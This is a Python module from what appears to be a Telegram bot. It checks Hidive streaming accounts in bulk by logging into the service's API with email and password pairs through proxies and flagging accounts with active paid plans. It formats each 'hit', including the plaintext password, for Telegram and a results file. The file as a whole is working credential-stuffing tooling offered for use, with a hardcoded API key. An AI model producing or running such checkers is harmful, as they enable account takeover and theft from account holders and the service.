"""
bot/modules/hidive.py
~~~~~~~~~~~~~~~~~~~~~
Hidive account checker using ``requests`` – exact logic from the working
standalone script.

Each check runs in its own ``requests.Session`` (isolated cookies/state)
and is dispatched via ``asyncio.to_thread()`` so the event loop stays free.
"""

from __future__ import annotations

import asyncio
from datetime import datetime
from typing import Optional

import requests

from bot.utils.logger import setup_logger

log = setup_logger("mod.hidive")

# ── API constants ───────────────────────────────────────────────────────
_API_KEY = "857a1e5d-e35e-4fdf-805b-a87b6f8364bf"
_APP_VAR = "6.57.10.b20743c"


# ── Synchronous check (mirrors working standalone script exactly) ───────

def _check_sync(
    email: str,
    password: str,
    proxy: Optional[dict[str, str]] = None,
) -> Optional[dict]:
    """Check a single Hidive account using ``requests.Session``.

    Returns a dict with hit details, a dict with ``free=True`` for free
    accounts, or ``None`` for bad credentials / errors.
    """
    session = requests.Session()
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US",
        "Content-Type": "application/json",
        "Host": "dce-frontoffice.imggaming.com",
        "Origin": "https://www.hidive.com",
        "Realm": "dce.hidive",
        "Referer": "https://www.hidive.com/",
        "x-api-key": _API_KEY,
        "x-app-var": _APP_VAR,
        "app": "dice",
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/132.0.0.0 Safari/537.36"
        ),
        "Connection": "keep-alive",
    }

    try:
        # 1. LOGIN
        r1 = session.post(
            "https://dce-frontoffice.imggaming.com/api/v2/login",
            json={"id": email, "secret": password},
            headers=headers, proxies=proxy, timeout=15,
        )

        if "authorisationToken" in r1.text:
            token = r1.json()["authorisationToken"]
            headers["Authorization"] = f"Bearer {token}"

            # 2. SUBSCRIPTION CHECK
            r2 = session.get(
                "https://dce-frontoffice.imggaming.com/api/v2/licence-family"
                "?includeEntitlements=ALL_ACTIVE_USER_ENTITLEMENTS",
                headers=headers, proxies=proxy, timeout=10,
            )

            # Exact check from working script — case-sensitive, precise
            if 'status":"ACTIVE' in r2.text:
                data = r2.json()
                family = data.get("licenceFamilies", [{}])[0]
                ent = family.get("entitlements", [{}])[0]

                plan_name = ent.get("name", "Premium")
                expiry_ms = family.get("expiryTimestamp", 0)
                try:
                    expiry_date = datetime.fromtimestamp(
                        expiry_ms / 1000
                    ).strftime("%Y-%m-%d")
                except Exception:
                    expiry_date = "N/A"

                return {
                    "email": email,
                    "password": password,
                    "plan": plan_name,
                    "expiry": expiry_date,
                }
            else:
                # Logged in but no active subscription → free account.
                return {"email": email, "password": password, "free": True}

        elif "failedAuthentication" in r1.text or r1.status_code == 401:
            return None
        else:
            return None

    except Exception as exc:
        log.debug("HD check failed for %s: %s", email, exc)
        return None


# ── Async wrapper ───────────────────────────────────────────────────────

async def check_account(
    email: str,
    password: str,
    proxy: Optional[dict[str, str]] = None,
) -> Optional[dict]:
    """Async wrapper — runs the synchronous check in a thread."""
    return await asyncio.to_thread(_check_sync, email, password, proxy)


# ── Formatting helpers ──────────────────────────────────────────────────

def format_hit(hit: dict) -> str:
    """Format a hit dictionary into a user-friendly Telegram string."""
    return (
        f"📺 **Hidive Hit**\n"
        f"┣ **Email:** `{hit['email']}`\n"
        f"┣ **Password:** `{hit['password']}`\n"
        f"┣ **Plan:** {hit['plan']}\n"
        f"┗ **Expiry:** {hit['expiry']}"
    )


def format_hit_line(hit: dict) -> str:
    """One-line format for results file."""
    return (
        f"{hit['email']}:{hit['password']} | "
        f"Plan={hit['plan']} | Expiry={hit['expiry']}"
    )
